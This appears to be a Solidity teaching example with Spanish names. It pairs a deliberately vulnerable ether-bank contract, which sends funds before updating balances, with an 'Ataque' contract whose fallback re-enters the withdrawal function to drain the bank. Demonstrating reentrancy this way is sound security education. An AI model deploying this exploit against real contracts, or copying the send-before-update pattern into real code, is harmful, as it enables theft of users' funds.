pragma solidity ^0.8.6;

contract BancoEther {
    //Limite de una semana
    uint constant public LIMITE_EXTRACCION = 1 ether;
    mapping(address => uint) public ultimaExtraccion;
    mapping(address => uint) public balances;

    function depositar() public payable {
        balances[msg.sender] += msg.value;
    }

    function extraer(uint _cantidad) public {
        require(balances[msg.sender] >= _cantidad);
        require(_cantidad <= LIMITE_EXTRACCION);
        require(block.timestamp >= ultimaExtraccion[msg.sender] + 1 weeks);

        (bool enviado, ) = msg.sender.call{value: _cantidad}("");
        require(enviado, "Fallo al enviar ether"); 

        balances[msg.sender] -= _cantidad;
        ultimaExtraccion[msg.sender] = block.timestamp;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Ataque {
    BancoEther public bancoEther;

    constructor(address _addressBancoEther) {
        bancoEther = BancoEther(_addressBancoEther);
    }

    // Fallback se llama cuando BancoEther envia Ether a este contrato.
    fallback() external payable {
        if (address(bancoEther).balance >= 1 ether) {
            bancoEther.extraer(1 ether);
        }
    }

    function atacar() external payable {
        require(msg.value >= 1 ether);
        bancoEther.depositar{value: 1 ether}();
        bancoEther.extraer(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}